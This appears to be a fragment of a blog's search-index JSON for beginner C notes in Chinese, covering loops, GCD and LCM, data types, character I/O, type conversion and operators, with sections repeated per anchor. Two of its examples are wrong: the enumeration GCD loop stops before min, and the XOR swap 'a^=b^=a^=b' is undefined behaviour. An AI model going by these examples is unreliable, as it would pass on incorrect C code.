","date":"2023-11-17","objectID":"/c_language_notes/:5:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#阶乘算法"},{"categories":["Programing"],"content":"\r5.1循环控制\r阶乘算法 int n; scanf_s(\"%d\",\u0026n); int fact = 1; int i =1; for(i=1;i\u003c=n;i++){ fact*=i; } printf(\"%d!=%d\\n\",n,fact); for循环语句 for (初始条件;循环继续的条件;循环结束后执行的语句) { } for像一个计数循环 Tips 如果有固定次数，用for语句更合适 如果必须执行一次，用do_while 其他情况用while 10 5 3 2 ","date":"2023-11-17","objectID":"/c_language_notes/:5:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#for循环语句"},{"categories":["Programing"],"content":"\r5.1循环控制\r阶乘算法 int n; scanf_s(\"%d\",\u0026n); int fact = 1; int i =1; for(i=1;i\u003c=n;i++){ fact*=i; } printf(\"%d!=%d\\n\",n,fact); for循环语句 for (初始条件;循环继续的条件;循环结束后执行的语句) { } for像一个计数循环 Tips 如果有固定次数，用for语句更合适 如果必须执行一次，用do_while 其他情况用while 10 5 3 2 ","date":"2023-11-17","objectID":"/c_language_notes/:5:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#tips"},{"categories":["Programing"],"content":"\r5.2循环控制\rbreak和continuebreak：当 break 关键字用于 while、for 循环时，会终止循环而执行整个循环语句后面的代码。break 关键字通常和 if 语句一起使用，即满足条件时便跳出循环。 continue：跳过循环这一轮剩下的语句，进入下一轮 接力break\rgoto语句（在多重嵌套的循环中，要从内层跳出，用goto语句 直接跳到标志位置 ","date":"2023-11-17","objectID":"/c_language_notes/:5:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#52循环控制"},{"categories":["Programing"],"content":"\r5.2循环控制\rbreak和continuebreak：当 break 关键字用于 while、for 循环时，会终止循环而执行整个循环语句后面的代码。break 关键字通常和 if 语句一起使用，即满足条件时便跳出循环。 continue：跳过循环这一轮剩下的语句，进入下一轮 接力break\rgoto语句（在多重嵌套的循环中，要从内层跳出，用goto语句 直接跳到标志位置 ","date":"2023-11-17","objectID":"/c_language_notes/:5:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#break和continue"},{"categories":["Programing"],"content":"\r5.2循环控制\rbreak和continuebreak：当 break 关键字用于 while、for 循环时，会终止循环而执行整个循环语句后面的代码。break 关键字通常和 if 语句一起使用，即满足条件时便跳出循环。 continue：跳过循环这一轮剩下的语句，进入下一轮 接力break\rgoto语句（在多重嵌套的循环中，要从内层跳出，用goto语句 直接跳到标志位置 ","date":"2023-11-17","objectID":"/c_language_notes/:5:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#接力break"},{"categories":["Programing"],"content":"\r5.2循环控制\rbreak和continuebreak：当 break 关键字用于 while、for 循环时，会终止循环而执行整个循环语句后面的代码。break 关键字通常和 if 语句一起使用，即满足条件时便跳出循环。 continue：跳过循环这一轮剩下的语句，进入下一轮 接力break\rgoto语句（在多重嵌套的循环中，要从内层跳出，用goto语句 直接跳到标志位置 ","date":"2023-11-17","objectID":"/c_language_notes/:5:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#goto语句"},{"categories":["Programing"],"content":"\r5.3循环应用\r求最大公约数\r1.枚举算法 #include \u003cstdio.h\u003e int main() { int a, b; int min; scanf(\"%d %d\", \u0026a, \u0026b); if (a \u003e b) { min = b; } else { min = a; } int ret = 0; int i; for (i = 1; i \u003c min; i++) { if (a % i == 0) { if (b % i == 0) { ret = i; } } } printf(\"%d和%d的最大公约数为%d.\\n\", a, b, ret); } 2.辗转相除法\r#include \u003cstdio.h\u003e int main() { int a, b; int t; scanf_s(\"%d %d\", \u0026a, \u0026b); while (b != 0) { t = a % b; a = b; b = t; printf(\"a=%d,b=%d,t=%d\\n\",a,b,t); } printf(\"gcd=%d\\n\", a); return 0; } 求最小公倍数 int main() { int a = 0, b = 0; scanf(\"%d %d\", \u0026a, \u0026b); int i = 1; while ((a * i) % b != 0) { i++; } printf(\"%d\\n\", i * a); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:5:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#53循环应用"},{"categories":["Programing"],"content":"\r5.3循环应用\r求最大公约数\r1.枚举算法 #include int main() { int a, b; int min; scanf(\"%d %d\", \u0026a, \u0026b); if (a \u003e b) { min = b; } else { min = a; } int ret = 0; int i; for (i = 1; i \u003c min; i++) { if (a % i == 0) { if (b % i == 0) { ret = i; } } } printf(\"%d和%d的最大公约数为%d.\\n\", a, b, ret); } 2.辗转相除法\r#include int main() { int a, b; int t; scanf_s(\"%d %d\", \u0026a, \u0026b); while (b != 0) { t = a % b; a = b; b = t; printf(\"a=%d,b=%d,t=%d\\n\",a,b,t); } printf(\"gcd=%d\\n\", a); return 0; } 求最小公倍数 int main() { int a = 0, b = 0; scanf(\"%d %d\", \u0026a, \u0026b); int i = 1; while ((a * i) % b != 0) { i++; } printf(\"%d\\n\", i * a); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:5:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#求最大公约数"},{"categories":["Programing"],"content":"\r5.3循环应用\r求最大公约数\r1.枚举算法 #include int main() { int a, b; int min; scanf(\"%d %d\", \u0026a, \u0026b); if (a \u003e b) { min = b; } else { min = a; } int ret = 0; int i; for (i = 1; i \u003c min; i++) { if (a % i == 0) { if (b % i == 0) { ret = i; } } } printf(\"%d和%d的最大公约数为%d.\\n\", a, b, ret); } 2.辗转相除法\r#include int main() { int a, b; int t; scanf_s(\"%d %d\", \u0026a, \u0026b); while (b != 0) { t = a % b; a = b; b = t; printf(\"a=%d,b=%d,t=%d\\n\",a,b,t); } printf(\"gcd=%d\\n\", a); return 0; } 求最小公倍数 int main() { int a = 0, b = 0; scanf(\"%d %d\", \u0026a, \u0026b); int i = 1; while ((a * i) % b != 0) { i++; } printf(\"%d\\n\", i * a); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:5:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#1枚举算法"},{"categories":["Programing"],"content":"\r5.3循环应用\r求最大公约数\r1.枚举算法 #include int main() { int a, b; int min; scanf(\"%d %d\", \u0026a, \u0026b); if (a \u003e b) { min = b; } else { min = a; } int ret = 0; int i; for (i = 1; i \u003c min; i++) { if (a % i == 0) { if (b % i == 0) { ret = i; } } } printf(\"%d和%d的最大公约数为%d.\\n\", a, b, ret); } 2.辗转相除法\r#include int main() { int a, b; int t; scanf_s(\"%d %d\", \u0026a, \u0026b); while (b != 0) { t = a % b; a = b; b = t; printf(\"a=%d,b=%d,t=%d\\n\",a,b,t); } printf(\"gcd=%d\\n\", a); return 0; } 求最小公倍数 int main() { int a = 0, b = 0; scanf(\"%d %d\", \u0026a, \u0026b); int i = 1; while ((a * i) % b != 0) { i++; } printf(\"%d\\n\", i * a); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:5:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#2辗转相除法"},{"categories":["Programing"],"content":"\r5.3循环应用\r求最大公约数\r1.枚举算法 #include int main() { int a, b; int min; scanf(\"%d %d\", \u0026a, \u0026b); if (a \u003e b) { min = b; } else { min = a; } int ret = 0; int i; for (i = 1; i \u003c min; i++) { if (a % i == 0) { if (b % i == 0) { ret = i; } } } printf(\"%d和%d的最大公约数为%d.\\n\", a, b, ret); } 2.辗转相除法\r#include int main() { int a, b; int t; scanf_s(\"%d %d\", \u0026a, \u0026b); while (b != 0) { t = a % b; a = b; b = t; printf(\"a=%d,b=%d,t=%d\\n\",a,b,t); } printf(\"gcd=%d\\n\", a); return 0; } 求最小公倍数 int main() { int a = 0, b = 0; scanf(\"%d %d\", \u0026a, \u0026b); int i = 1; while ((a * i) % b != 0) { i++; } printf(\"%d\\n\", i * a); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:5:2","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#求最小公倍数"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char\u003cshort\u003cint\u003cfloat\u003cdouble sizeof给出某个类型或变量在内存中所占据的字节数 sizeof()是一个静态运算符，不能在括号内进行运算 #include \u003cstdio.h\u003e int main() { int a; a = 6; printf(\"sizeof(double)=%ld\\n\", sizeof(long double)); printf(\"sizeof(a)=%ld\\n\", sizeof(a)); return 0; } 补码\runsigned\r整数越界\r整数的输入输出\rint类型输入输出形式： 十进制：%d 八进制：%o 十六进制：%x 八进制和十六进制\r十六进制很适合表达二进制数据，因为四位二进制正好是一个十六进制位 整数类型的选择\r所以说，没有特殊需要，就选择int 浮点类型\r实数类型，即实型，又称为浮点型，指存在小数部分的数。浮点型数据有单精度浮点型和双精度浮点型两种。 实型常量即实数，又称为浮点数，都是双精度浮点型，%e可输出科学计数法。 科学计数法\r输出小数 #include \u003cstdio.h\u003e int main() { double ff = 1e-10; printf(\"%e,%f\\n\", ff, ff); return 0; } 这样的话，%e显示的科学计数法可以表示，但用%f输出的单精小数无法显示具体数值， printf(\"%e,%.16f\\n\", ff, ff); 添加.16来修改输出的小数点后面的位数 宽度限定词指定数据的输出宽度， 整型数据的输出格式控制说明%md，制定了数据的输出宽度为m(包含符号位) 若数据的实际位数小于m，则左侧补空格，若大于m，则按实际位数输出 实型数据的输出格式控制说明%m.nf，指定了输出浮点型数据时保留n位小数，且输出宽度是m(包括符号位和小数点)(同时实际位数小于m左端补空格，大于m按实际输出) 超过范围的浮点数printf输出inf表示超过范围的浮点数 printf输出nan表示不存在的浮点数 浮点运算的精度\r带小数点的字面量是double而非float float需要用f或F后缀来表明身份 选择浮点类型​ 没有特殊需要就选double ​ 现代CPU能直接对double做硬件运算，性能不会比float差，在64位的机器上，数据存储的速度也不比float慢 字符类型char是一种整数，也是一种字符类型 printf和scanf里用%c来输入输出字符 以上这段代码中，c是整数1，d是字符'1’，故输出的结果为不相等 字符的输入输出\r字符数据的输入输出可以调用函数scanf()、printf()、getchar()、putchar() getchar()从键盘输入一个字符，并赋值给变量 putchar()输出一个字符，调用格式为：putchar(输出参数); 若要实现多字符的输入和输出，就要循环调用putchar和getchar,下面给出一个栗子： #include\u003cstdio.h\u003e int main(){ char ch; int first=1,k; printf(\"Enter 8 characters:\"); for(k=1;k\u003c=8;k++){ ch = getchar(); if(first==1){ putchar(ch); first=0; }else{ putchar('-'); putchar(ch); } } return 0; } 字符计算\r大小写转换 字母在ASCII表中是顺序排列的 大写字母和小写字母是分开排列的，并不在一起 ‘a’-‘A’可以得到两段之间的距离，于是 ​ a+‘a’-‘A’可以把一个大写字母变成小写字母 ​ a+‘A’-‘a’可以把一个小写字母变成大写字母 eg.输入一行字符，以回车符’\\n’结束输入，将其中的大写字母转换为相应的小写字母，小写字母转换为相应的大写字母，其他字符原样输出 #include\u003cstdio.h\u003e int main(){ printf(\"Input characters:\"); char ch; ch=getchar(); while(ch!='\\n'){ if(ch\u003e='A'\u0026\u0026ch\u003c='Z'){ ch=ch-'A'+'a'; } else if(ch\u003e='a'\u0026\u0026ch\u003c='z'){ ch=ch-'a'+'A'; } putchar(ch); //输出转换后的字符 ch=getchar(); } return 0; } 逃逸字符​ 用来表达无法印出来的控制字符或特殊字符，它由一个反斜杠\"\\\"开头，后面跟上另一个字符，这两个字符合起来，组成了一个字符 ​ 举个栗子： printf(\"请分别输入身高的英尺和英寸。\"“如输入\\\"5 7 \\\"表示5英尺7英寸:\"); 不同的shell会对特殊字符有不同的处理方式 比如\\b有些shell会解释为退一个(但不是删除，如果有新字符录入，则会覆盖) 转义字符由反斜杠加一个字符或数字组成，它把反斜杠后的字符或数字转换成别的意义，虽然转义字符形式上由多个字符组成，但它是字符常量，只代表一个字符。 自动类型转换当运算符的两边出现不一致的类型时，会自动转换成较大的类型 大的意思是能表达的数的范围更大 对于printf，任何小于int的类型会被转换成int，float会被转换成double 但是scanf不会，要输入short，需要%hd 强制类型转换要把一个量强制转换成另一个类型(通常是一个较小的类型) 格式：(类型)值 例如：(int)10.2 注意这时候的安全性，小的变量不总能表达大的变量 强制类型转换的优先级高于四则运算 整数的类型转换强制类型转换(大转小)或遇高级时自动转换(小转大) bool #include\u003cstdbool.h\u003e 之后就可以使用bool和true、false 当然，用printf输出的时候只能输出1或者0，无法输出true或者false ","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#61数据类型"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数据的储存"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#sizeof"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#补码"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#unsigned"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#整数越界"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#整数的输入输出"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#八进制和十六进制"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#整数类型的选择"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#浮点类型"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#科学计数法"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#输出小数"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#宽度限定词"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#超过范围的浮点数"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#浮点运算的精度"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#选择浮点类型"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符类型"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符的输入输出"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#getchar"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#putchar"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#字符计算"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#大小写转换"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#逃逸字符"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#自动类型转换"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#强制类型转换"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#整数的类型转换"},{"categories":["Programing"],"content":"\r6.1数据类型\r数据的储存正数的原码、反码、补码相同，符号位是0 负数的原码、反码、补码不同： 原码：符号位是1，其余各位表示数值的绝对值 反码：符号位是1，其余各位对原码取反 补码：反码+1 c语言数据类型：整型、字符型、实型 早期语言强调类型（面向底层） 整数 char、short、int、long、longlong 浮点数 float、double、longdouble 逻辑 bool 指针 自定义类型 所表达的数的范围：char","date":"2023-11-17","objectID":"/c_language_notes/:6:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#bool"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include\u003cstdio.h\u003e int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#62逻辑运算"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 逻辑量是关系运算或者逻辑运算的结果 例如要表示可以 如何判断一个字符c是否是大写字母？\r优先级\r短路\r条件运算符是一个三目运算符，一般形式： 表达式1 ？ 表达式二2：表达式3 优先级高于赋值运算符，但比其他运算符低 嵌套条件表达式\r(不希望使用嵌套条件表达式) 逗号运算符连接两个表达式，以右边的表达式的值作为它的结果。 优先级最低 组合关系为自左向右 用处：主要是在for语句中使用 e.g. a=3*5,a*4 //a=15,表达式值60 a=3*5,a*4,a+5 //a=15,表达式值20 位运算进行二进制位的运算 运算符 名称 \u0026 按位“与” | 按位“或” ^ 按位“异或” ~ 取反 « 左移 » 右移 除了~是单目运算之外，其余均为二目运算 异或运算^有一个神奇的应用： 交换a和b的值： a^=b^=a^=b; e.g. #include int main(){ int a=1; int b=5; a^=b^=a^=b; printf(\"a=%d,b=%d\",a,b); return 0; } //a=5,b=1 ","date":"2023-11-17","objectID":"/c_language_notes/:6:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#如何判断一个字符c是否是大写字母"},{"categories":["Programing"],"content":"\r6.2逻辑运算是对逻辑量进行的运算，结果只有1或者0 